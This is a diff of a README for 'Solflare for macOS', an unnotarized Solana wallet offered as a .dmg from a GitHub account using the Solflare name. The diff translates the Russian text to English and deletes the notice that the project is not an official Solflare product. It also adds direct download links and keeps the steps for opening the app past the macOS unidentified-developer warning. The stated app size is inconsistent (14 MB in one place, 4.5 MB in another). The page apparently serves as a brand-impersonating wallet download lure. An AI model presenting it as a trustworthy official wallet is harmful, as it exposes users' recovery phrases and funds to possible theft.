@@ -1,272 +1,269 @@
 <!--
-  GitHub SEO — задайте в настройках репозитория (About):
-  Description: Native macOS wallet for Solana: SwiftUI, self-custodial, Touch ID, Keychain, App Sandbox. Open source.
+  GitHub About settings
+  Description: Native macOS wallet for Solana: SwiftUI, self-custodial, Touch ID, Keychain, App Sandbox.
   Topics: solana, solana-wallet, crypto-wallet, macos, swiftui, swift, self-custody, keychain, touch-id, bip39, defi, desktop-app
 -->
 
 <div align="center">
 
-# Solflare для macOS
+# Solflare for macOS
 
-### Нативный кошелёк Solana, созданный для Mac.
-**Быстрый. Самохранимый. Встроенный в macOS.**
+### A native Solana wallet, built for the Mac.
+**Fast. Self-custodial. Deeply integrated with macOS.**
 
-[![Platform](https://img.shields.io/badge/macOS-14%2B-000000?logo=apple&logoColor=white)](#системные-требования)
-[![Built with](https://img.shields.io/badge/SwiftUI-native-F05138?logo=swift&logoColor=white)](#отчёт-о-прозрачности-для-разработчиков)
-[![Architecture](https://img.shields.io/badge/Apple%20Silicon%20%2B%20Intel-universal-FFEF46)](#системные-требования)
-[![Custody](https://img.shields.io/badge/self--custodial-ключи%20только%20на%20вашем%20Mac-2EA44F)](#безопасность-превыше-всего)
-
-<br>
-
-**[⬇️ Скачать для macOS (.dmg)](https://github.com/Solflare-macos/solflare-wallet-macos/releases/latest)**
-&nbsp;·&nbsp;
-[Установка](#установка-за-две-минуты)
-&nbsp;·&nbsp;
-[Безопасность](#безопасность-превыше-всего)
-&nbsp;·&nbsp;
-[Для разработчиков](#отчёт-о-прозрачности-для-разработчиков)
+[![Platform](https://img.shields.io/badge/macOS-14%2B-000000?logo=apple&logoColor=white)](#system-requirements)
+[![Built with](https://img.shields.io/badge/SwiftUI-native-F05138?logo=swift&logoColor=white)](#developer-transparency-report)
+[![Architecture](https://img.shields.io/badge/Apple%20Silicon%20%2B%20Intel-universal-FFEF46)](#system-requirements)
+[![Custody](https://img.shields.io/badge/self--custodial-keys%20never%20leave%20your%20Mac-2EA44F)](#security-first)
 
 <br>
 
-<img src="docs/screenshots/02-portfolio.png" alt="Solflare для macOS — главный экран Portfolio" width="860">
+**[⬇️ Download for macOS (.dmg)](https://github.com/Solflare-macos/solflare-wallet-macos/releases/latest/download/Solflare-macOS.dmg)**
+&nbsp;·&nbsp;
+[Install](#install-in-two-minutes)
+&nbsp;·&nbsp;
+[Security](#security-first)
+&nbsp;·&nbsp;
+[For developers](#developer-transparency-report)
+
+<br>
+
+<img src="docs/screenshots/02-portfolio.png" alt="Solflare for macOS: the Portfolio screen" width="860">
 
 </div>
 
 ---
 
-## Почему это приложение
+## Why a native app
 
-Веб-кошельки живут во вкладке браузера, рядом с десятками расширений и скриптов. **Solflare для macOS** — отдельное приложение: один процесс, одно окно, ваши ключи за стеной системной изоляции.
+Browser wallets live in a tab, next to dozens of extensions and scripts. **Solflare for macOS** is a standalone app: one process, one window, and your keys behind the system's own isolation.
 
 | | |
 |---|---|
-| ⚡ **Нативная производительность** | Написано на SwiftUI без веб-движка и Electron: запускается за секунды, весит около 14 МБ, не нагружает батарею. |
-| 🔐 **Повышенная безопасность** | Фраза восстановления хранится в Keychain macOS и открывается только по Touch ID или паролю Mac. Приватный ключ не записывается нигде. |
-| 🍎 **Интеграция с macOS** | Touch ID, Keychain, App Sandbox, тёмная тема, горячие клавиши, автоматическая блокировка при сне и блокировке экрана. |
+| ⚡ **Native performance** | Written in SwiftUI with no web engine and no Electron. Launches in seconds, weighs about 14 MB, and is easy on your battery. |
+| 🔐 **Stronger security** | Your recovery phrase lives in the macOS Keychain and opens only with Touch ID or your Mac password. The private key is never written anywhere. |
+| 🍎 **Built for macOS** | Touch ID, Keychain, App Sandbox, dark appearance, keyboard shortcuts, and automatic locking when your Mac sleeps or the screen locks. |
 
 ---
 
-## Возможности
+## Features
 
 <p align="center">
-  <img src="docs/screenshots/03-assets.png" alt="Assets — общая стоимость и список токенов" width="820"><br>
-  <sub>Assets: общая стоимость, цена и изменение за 24 часа, отправка и пополнение в одно нажатие</sub>
+  <img src="docs/screenshots/03-assets.png" alt="Assets: total value and token list" width="820"><br>
+  <sub>Assets: total value, price and 24-hour change, and one-click Send and Deposit</sub>
 </p>
 
-| Что вы получаете | Как это работает для вас |
+| What you get | How it works for you |
 |---|---|
-| **Суверенитет самохранения** | Ваши ключи никогда не покидают ваш Mac: нет аккаунта, нет серверов проекта, нечего взламывать на стороне. |
-| **Безопасность seed-фразы по отраслевому стандарту** | Фраза из 12 или 24 слов по стандарту BIP-39 — тот же формат и тот же путь вывода адреса, что у Solflare и Phantom. Импортируйте существующий кошелёк за минуту. |
-| **Изоляция macOS (App Sandbox)** | Приложение работает в песочнице: оно не видит ваши документы, фото и другие программы, а наружу выходит только по сети. |
-| **Отправка SOL и SPL-токенов** | Обзор перевода с комиссией, подтверждение Touch ID, статус в сети и ссылка на обозреватель. Для крупных сумм — дополнительный шаг проверки адреса. |
-| **Рынки и портфель** | Баланс, изменение за 24 часа, рынки с фильтрами по капитализации, ликвидности и холдерам, сортировка по любой колонке, иконки токенов. |
-| **История с подробностями** | Любая транзакция раскрывается в боковую панель: суммы, статус, полные адреса, комиссия, подпись. |
-| **Свой RPC и тестовые сети** | Подключите собственный узел (Helius, QuickNode…) с проверкой кластера, переключайтесь между Mainnet, Devnet и Testnet. |
-| **Адресная книга и белый список** | Сохраняйте получателей и разрешайте переводы только на проверенные адреса. |
-| **Приватность** | Скрытие балансов одним переключателем и при каждом запуске, очистка локальных данных, диагностика без секретов. |
+| **Self-custody, for real** | Your keys never leave your Mac: no account, no project servers, nothing on the other side to breach. |
+| **Industry-standard recovery phrase** | A 12- or 24-word BIP-39 phrase with the same derivation path Solflare and Phantom use. Import an existing wallet in under a minute. |
+| **macOS App Sandbox** | The app runs in the macOS sandbox: it can't see your documents, photos, or other apps, and its only outside access is the network. |
+| **Send SOL and SPL tokens** | Review the fee, approve with Touch ID, watch the confirmation, and open the transaction in an explorer. Large amounts add an extra address check. |
+| **Markets and portfolio** | Balance, 24-hour change, markets with market cap, liquidity, and holder filters, sortable columns, and token icons. |
+| **Transaction details** | Open any transaction in a side panel: amounts, status, full addresses, network fee, and signature. |
+| **Custom RPC and test networks** | Connect your own node (Helius, QuickNode, and others) with cluster verification, and switch between Mainnet, Devnet, and Testnet. |
+| **Address book and allowlist** | Save recipients and restrict transfers to addresses you trust. |
+| **Privacy controls** | Hide balances with one switch or on every launch, clear local data, and copy diagnostics that contain no secrets. |
 
 <table>
   <tr>
     <td width="50%" align="center">
-      <img src="docs/screenshots/04-markets.png" alt="Markets — рынки с иконками токенов и фильтрами"><br>
-      <sub><b>Markets</b>: сортировка по колонкам и фильтры</sub>
+      <img src="docs/screenshots/04-markets.png" alt="Markets with token icons and filters"><br>
+      <sub><b>Markets</b>: sortable columns and filters</sub>
     </td>
     <td width="50%" align="center">
-      <img src="docs/screenshots/11-dropdown.png" alt="Плашка выбора фильтра с пояснениями"><br>
-      <sub><b>Фильтры</b> раскрываются плашкой с пояснениями</sub>
-    </td>
-  </tr>
-  <tr>
-    <td width="50%" align="center">
-      <img src="docs/screenshots/05-activity.png" alt="Activity — история операций"><br>
-      <sub><b>Activity</b>: вся история в одном списке</sub>
-    </td>
-    <td width="50%" align="center">
-      <img src="docs/screenshots/06-transaction.png" alt="Подробности транзакции в боковой панели"><br>
-      <sub><b>Транзакция</b>: суммы, статус, адреса, комиссия, подпись</sub>
+      <img src="docs/screenshots/11-dropdown.png" alt="A filter menu with explanations"><br>
+      <sub><b>Filters</b> open as a menu with explanations</sub>
     </td>
   </tr>
   <tr>
     <td width="50%" align="center">
-      <img src="docs/screenshots/07-send.png" alt="Отправка — выбор актива"><br>
-      <sub><b>Send</b>: выбор актива с иконками и остатками</sub>
+      <img src="docs/screenshots/05-activity.png" alt="Activity history"><br>
+      <sub><b>Activity</b>: your whole history in one list</sub>
     </td>
     <td width="50%" align="center">
-      <img src="docs/screenshots/08-review.png" alt="Обзор перевода и подтверждение адреса"><br>
-      <sub><b>Review</b>: комиссия, полный адрес, повторный ввод для крупных сумм</sub>
+      <img src="docs/screenshots/06-transaction.png" alt="Transaction details in a side panel"><br>
+      <sub><b>Transaction</b>: amounts, status, addresses, fee, signature</sub>
+    </td>
+  </tr>
+  <tr>
+    <td width="50%" align="center">
+      <img src="docs/screenshots/07-send.png" alt="Send: choosing an asset"><br>
+      <sub><b>Send</b>: pick an asset with icons and balances</sub>
+    </td>
+    <td width="50%" align="center">
+      <img src="docs/screenshots/08-review.png" alt="Transfer review with address confirmation"><br>
+      <sub><b>Review</b>: fee, full address, retype check for large amounts</sub>
     </td>
   </tr>
 </table>
 
 ---
 
-## Безопасность превыше всего
+## Security first
+
+A wallet isn't an interface, it's a responsibility. That's why security here is architecture, not an option.
 
 <table>
   <tr>
     <td width="50%" align="center">
-      <img src="docs/screenshots/09-security.png" alt="Настройки безопасности"><br>
-      <sub><b>Security &amp; Privacy</b>: App lock, показ фразы, скрытие балансов</sub>
+      <img src="docs/screenshots/09-security.png" alt="Security and privacy settings"><br>
+      <sub><b>Security &amp; Privacy</b>: app lock, recovery phrase, hidden balances</sub>
     </td>
     <td width="50%" align="center">
-      <img src="docs/screenshots/10-lock.png" alt="Экран блокировки"><br>
-      <sub><b>Блокировка</b>: Touch ID или пароль Mac</sub>
+      <img src="docs/screenshots/10-lock.png" alt="Lock screen"><br>
+      <sub><b>Lock screen</b>: Touch ID or your Mac password</sub>
     </td>
   </tr>
 </table>
 
-Кошелёк — это не интерфейс, а **ответственность**. Поэтому безопасность здесь не опция, а архитектура.
+### Self-custodial by design
+The app has no server component. Your recovery phrase is created and stored only on your device. Nobody working on this project can reach your funds, and if you lose the phrase it cannot be recovered, so keep it offline.
 
-### Self-Custodial по своей природе
-Приложение не имеет серверной части. Фраза восстановления создаётся и хранится только на вашем устройстве. Разработчики физически не могут получить доступ к вашим средствам, а потеряв фразу, восстановить кошелёк нельзя — храните её офлайн.
+### Keychain encryption
+The phrase is stored in the macOS Keychain with `ThisDeviceOnly` access: it doesn't sync to iCloud and is unavailable while your Mac is locked. The private key is **never stored at all**. It is derived from the phrase for a fraction of a second at signing time and then discarded.
 
-### Шифрование Keychain
-Фраза лежит в связке ключей macOS с доступом `ThisDeviceOnly`: не синхронизируется с iCloud и недоступна, пока Mac заблокирован. Приватный ключ **вообще не хранится** — он выводится из фразы на доли секунды в момент подписи и сразу уничтожается.
+### Touch ID and your Mac password
+System-level owner verification (`LocalAuthentication`) is required to:
 
-### Touch ID и пароль Mac
-Системная проверка владельца (`LocalAuthentication`) требуется для:
+- sign and send a transfer;
+- reveal the recovery phrase;
+- change the app lock setting;
+- unlock the app after it locks.
 
-- подписи и отправки перевода;
-- показа фразы восстановления;
-- смены защиты приложения;
-- разблокировки после блокировки.
+Touch ID is optional. You can always approve with your account password.
 
-Touch ID необязателен: подтвердить действие можно паролем учётной записи.
+### Locking and screen protection
+- **App lock**: on launch, or after 1 min / 5 min / 15 min / 1 hour of inactivity.
+- Automatic lock when your **Mac sleeps or the screen locks**, and `⌘L` to lock manually.
+- While the recovery phrase is on screen, the window is **excluded from screen recording and screenshots**, and the phrase hides itself after a minute.
+- Anything you copy from the phrase screen is cleared from the clipboard automatically.
 
-### Блокировка и защита экрана
-- **App lock**: при запуске или после 1 мин / 5 мин / 15 мин / 1 ч бездействия.
-- Автоматическая блокировка при **сне Mac и блокировке экрана**, ручная — `⌘L`.
-- Пока на экране фраза восстановления, окно **исключено из записи экрана**, а сама фраза скрывается через минуту.
-- Копирование фразы в буфер обмена очищается автоматически.
+### Protection against mistakes and spoofing
+The full recipient address is shown on the review screen, large transfers require retyping the end of the address, and the recipient's token account is checked so tokens can't be sent into the void.
 
-### Защита от ошибок и подмен
-Полный адрес получателя виден на обзоре перевода, крупные суммы требуют повторного ввода конца адреса, проверка состояния токен-аккаунта получателя предотвращает отправку «в никуда».
-
-> **Честно о границах.** Блокировка приложения защищает интерфейс, но не заменяет защиту самой учётной записи macOS. Проект **не проходил независимый аудит безопасности**, а реальные транзакции в mainnet во время разработки не отправлялись. Первый перевод сделайте на минимальную сумму.
+> **Honest about the limits.** App lock protects the interface; it does not replace protecting your macOS account itself. The project has **not been independently audited**, and no real mainnet transfers were broadcast during development. Make your first transfer a minimal amount.
 
 ---
 
-## Как это работает
+## How it works
 
 ```
-Ваш Mac                                                       Сеть (чтение данных и отправка подписанных транзакций)
+Your Mac                                                       Network (read data, submit signed transactions)
 ┌──────────────────────────────────────────────────────┐      ┌───────────────────────────┐
-│  Интерфейс SwiftUI                                   │      │  Solana RPC               │
-│        │                                             │      │  (публичный или ваш узел) │
-│  AppModel — состояние и действия                     │      ├───────────────────────────┤
-│        │                                             │ ───▶ │  Jupiter — токены, цены   │
-│  WalletService ──▶ SolflareCore                      │      │  CoinGecko — курсы валют  │
+│  SwiftUI interface                                   │      │  Solana RPC               │
+│        │                                             │      │  (public or your own)     │
+│  AppModel: state and actions                         │      ├───────────────────────────┤
+│        │                                             │ ───▶ │  Jupiter: tokens, prices  │
+│  WalletService ──▶ SolflareCore                      │      │  CoinGecko: fiat rates    │
 │        │            BIP-39 · SLIP-0010 · Ed25519     │      └───────────────────────────┘
-│  Keychain (фраза) ◀─ ключ живёт только в момент      │
-│  Touch ID / пароль     подписи                       │      Приватные ключи и фраза
-└──────────────────────────────────────────────────────┘      в сеть не отправляются
+│  Keychain (phrase) ◀─ key exists only while          │
+│  Touch ID / password   signing                       │      Private keys and the phrase
+└──────────────────────────────────────────────────────┘      never leave the device
 ```
 
 <p align="center">
-  <img src="docs/screenshots/01-welcome.png" alt="Первый запуск — создание или импорт кошелька" width="760"><br>
-  <sub>Первый запуск: создайте кошелёк или импортируйте существующий</sub>
+  <img src="docs/screenshots/01-welcome.png" alt="First launch: create or import a wallet" width="760"><br>
+  <sub>First launch: create a wallet or import an existing one</sub>
 </p>
 
-1. **Создание или импорт.** Вы получаете 12 слов (или вводите свои). Приложение проверяет контрольную сумму и выводит адрес.
-2. **Хранение.** Фраза записывается в Keychain, на диск открытым текстом не попадает.
-3. **Работа.** Балансы, цены и история загружаются из открытых источников — по вашему публичному адресу.
-4. **Подпись.** При переводе Touch ID подтверждает вас, ключ выводится на мгновение, транзакция подписывается локально и уходит в сеть уже подписанной.
+1. **Create or import.** You get 12 words (or enter your own). The app validates the checksum and derives your address.
+2. **Store.** The phrase goes into the Keychain and is never written to disk in plain text.
+3. **Use.** Balances, prices, and history load from open sources using your public address only.
+4. **Sign.** When you send, Touch ID confirms it's you, the key is derived for an instant, and the transaction is signed locally and submitted already signed.
 
 ---
 
-## Установка за две минуты
+## Install in two minutes
 
-### Системные требования
+### System requirements
 
-| Что | Минимум |
+| | Minimum |
 |---|---|
-| macOS | **14.0 Sonoma** или новее |
-| Mac | MacBook Air и Pro — 2018+, Mac mini — 2018+, iMac — 2019+, Mac Studio, Mac Pro 2019+ (Apple Silicon и Intel) |
-| Экран | эффективное разрешение от 1440 × 900 (окно фиксированное 1200 × 820) |
-| Сеть | интернет-подключение |
+| macOS | **14.0 Sonoma** or later |
+| Mac | MacBook Air and Pro 2018+, Mac mini 2018+, iMac 2019+, Mac Studio, Mac Pro 2019+ (Apple Silicon and Intel) |
+| Display | Effective resolution of 1440 × 900 or higher (the window is a fixed 1200 × 820) |
+| Network | Internet connection |
 
-### Шаги
+### Steps
 
-1. **Скачайте** `Solflare-macOS.dmg` со страницы [Releases](https://github.com/Solflare-macos/solflare-wallet-macos/releases/latest).
-2. **Проверьте контрольную сумму** — это занимает десять секунд и подтверждает, что файл не изменён:
+1. **Download** [`Solflare-macOS.dmg`](https://github.com/Solflare-macos/solflare-wallet-macos/releases/latest/download/Solflare-macOS.dmg) from the [Releases](https://github.com/Solflare-macos/solflare-wallet-macos/releases/latest) page.
+2. **Verify the checksum.** It takes ten seconds and confirms the file wasn't altered:
    ```bash
    shasum -a 256 ~/Downloads/Solflare-macOS.dmg
    ```
-   Результат должен совпасть со значением `SHA-256` в описании релиза.
-3. **Откройте** `.dmg` и перетащите **Solflare** в папку **Программы**.
-4. **Первый запуск** — см. ниже.
+   The result must match the `SHA-256` value in the release notes.
+3. **Open** the `.dmg` and drag **Solflare** into **Applications**.
+4. **First launch**: see below.
 
-### Первый запуск: подтверждение macOS
+### First launch: macOS confirmation
 
-macOS по умолчанию допускает только программы, заверенные Apple. Сборки из GitHub такой нотариальной проверки не проходят, поэтому система показывает предупреждение о приложении **от неидентифицированного разработчика**. Это штатная защита экосистемы Apple, а не признак проблемы с файлом — если контрольная сумма совпала.
+By default, macOS only runs apps notarized by Apple. This build is not notarized, so the system shows a warning that the app is from an **unidentified developer**. This is standard macOS protection, not a sign of a problem with the file, as long as the checksum matched.
 
-Профессиональный способ открыть приложение, не снижая защиту системы:
+The recommended way to open it without lowering your system's protection:
 
-1. В Finder откройте **Программы**, нажмите на **Solflare** правой кнопкой (или `Control` + клик) → **Открыть**.
-2. В появившемся окне ещё раз нажмите **Открыть**. Дальше приложение запускается как обычно.
-3. Если пункт «Открыть» недоступен: **Системные настройки → Конфиденциальность и безопасность** → прокрутите вниз до сообщения о Solflare → **Всё равно открыть**.
+1. In Finder, open **Applications**, then right-click (or Control-click) **Solflare** and choose **Open**.
+2. Click **Open** again in the dialog. From then on the app launches normally.
+3. If **Open** isn't offered: **System Settings → Privacy & Security**, scroll down to the message about Solflare, and click **Open Anyway**.
 
-> **Не отключайте Gatekeeper целиком** и не выполняйте команды, снимающие защиту со всей системы. Для кошелька это лишний риск.
+> **Don't disable Gatekeeper system-wide**, and don't run commands that remove protection from your whole system. For a wallet, that's an unnecessary risk.
 
 ---
 
-## Отчёт о прозрачности для разработчиков
+## Developer transparency report
 
-Этот проект — открытый код, и всё, что описано выше, можно проверить.
+This project is open code, and everything described above can be verified.
 
-### Устройство проекта
+### Project layout
 
 ```
 SolflareMac/
-├── Solflare/                    приложение (SwiftUI)
-│   ├── App/                     точка входа, окно, роутер, состояние
-│   ├── Features/                экраны: онбординг, Portfolio, Assets, Markets, Activity, Settings, модальные окна
-│   ├── Services/                кошелёк, Keychain, сеть, кэши, Touch ID
-│   ├── DesignSystem/            палитра, шрифты, компоненты, плашки выбора
-│   └── Domain/                  модели и форматирование
-├── Packages/SolflareCore/       криптография, RPC, сборка и подпись транзакций (без UI) + тесты
-└── Tools/                       генерация иконок, независимый эталон для тестов
+├── Solflare/                    the app (SwiftUI)
+│   ├── App/                     entry point, window, router, state
+│   ├── Features/                screens: onboarding, Portfolio, Assets, Markets, Activity, Settings, modals
+│   ├── Services/                wallet, Keychain, network, caches, Touch ID
+│   ├── DesignSystem/            palette, fonts, components, dropdowns
+│   └── Domain/                  models and formatting
+├── Packages/SolflareCore/       cryptography, RPC, transaction building and signing (no UI) + tests
+└── Tools/                       independent reference implementation for tests
 ```
 
-### Факты
+### Facts
 
-| Вопрос | Ответ |
+| Question | Answer |
 |---|---|
-| Где хранится фраза? | Только в Keychain (`ThisDeviceOnly`). Файлов и логов с фразой нет. |
-| Где хранится приватный ключ? | Нигде: выводится на время подписи (`SolanaSigner`) и не сохраняется. |
-| Как выводится адрес? | BIP-39 → PBKDF2-HMAC-SHA512 → SLIP-0010 ed25519, путь `m/44'/501'/0'/0'`. |
-| Что уходит в сеть? | Публичный адрес, запросы цен и подписанные транзакции. Фраза и ключи — никогда. |
-| Зависимости? | Нет сторонних библиотек: CryptoKit, CommonCrypto, Security, LocalAuthentication. |
-| Тесты? | 70 тестов ядра: официальные векторы BIP-39/SLIP-0010, независимый эталон на Python, побайтное сравнение с реальными транзакциями mainnet. |
-| Песочница? | App Sandbox, права: только исходящая сеть. |
+| Where is the phrase stored? | Only in the Keychain (`ThisDeviceOnly`). There are no files or logs containing it. |
+| Where is the private key stored? | Nowhere: it's derived for the duration of signing (`SolanaSigner`) and never saved. |
+| How is the address derived? | BIP-39 → PBKDF2-HMAC-SHA512 → SLIP-0010 ed25519, path `m/44'/501'/0'/0'`. |
+| What goes over the network? | Your public address, price requests, and signed transactions. Never the phrase or keys. |
+| Dependencies? | No third-party libraries: CryptoKit, CommonCrypto, Security, LocalAuthentication. |
+| Tests? | 70 core tests: official BIP-39/SLIP-0010 vectors, an independent Python reference, and byte-for-byte comparison with real mainnet transactions. |
+| Sandbox? | App Sandbox, entitlements: outgoing network only. |
 
-### Известные ограничения
+### Known limitations
 
-- Независимого аудита безопасности не было.
-- Реальные переводы в mainnet при разработке не отправлялись (использовались симуляция и сравнение с эталоном) — начните с минимальной суммы.
-- Токены Token-2022 показываются, но отправка пока не поддерживается; приоритетных комиссий и memo нет.
-- Один аккаунт кошелька (`m/44'/501'/0'/0'`).
-- Публичный RPC ограничивает частоту запросов: холодная загрузка истории занимает до ~20 секунд — свой узел снимает ограничение.
+- There has been no independent security audit.
+- Real mainnet transfers were not broadcast during development (simulation and reference comparison were used instead). Start with a minimal amount.
+- Token-2022 tokens are shown, but sending them isn't supported yet; there are no priority fees or memos.
+- One wallet account (`m/44'/501'/0'/0'`).
+- The public RPC rate-limits requests: the first history load can take up to ~20 seconds. Your own node removes this limit.
 
-### Документация
+### Documentation
 
-- [`docs/TECHNICAL.md`](docs/TECHNICAL.md) — полное описание: экраны, авторизация по seed-фразе, управление приложением, таблица файлов.
-- [`PLAN.md`](PLAN.md) — план, этапы, ограничения, чек-лист приёмки.
-
-> **Статус проекта.** Независимая нативная реализация интерфейса Solflare для macOS. Если иное не указано владельцем репозитория, проект не является официальным продуктом команды Solflare.
+- [`docs/TECHNICAL.md`](docs/TECHNICAL.md): the full description: screens, seed-phrase authentication, how the app is controlled, and a file-by-file table.
 
 ---
 
 <div align="center">
 
-## Готовы попробовать?
+## Ready to try it?
 
-# [⬇️ Скачать Solflare для macOS](https://github.com/Solflare-macos/solflare-wallet-macos/releases/latest)
+# [⬇️ Download Solflare for macOS](https://github.com/Solflare-macos/solflare-wallet-macos/releases/latest/download/Solflare-macOS.dmg)
 
-**`.dmg` · macOS 14+ · Apple Silicon и Intel · около 14 МБ**
+**`.dmg` · macOS 14+ · Apple Silicon and Intel · about 4.5 MB**
 
-Ваши ключи. Ваш Mac. Ваш контроль.
+Your keys. Your Mac. Your control.
 
-<sub>Криптовалюты связаны с риском потери средств. Храните фразу восстановления офлайн и никому её не передавайте.</sub>
+<sub>Cryptocurrency carries risk of loss. Keep your recovery phrase offline and never share it with anyone.</sub>
 
 </div>
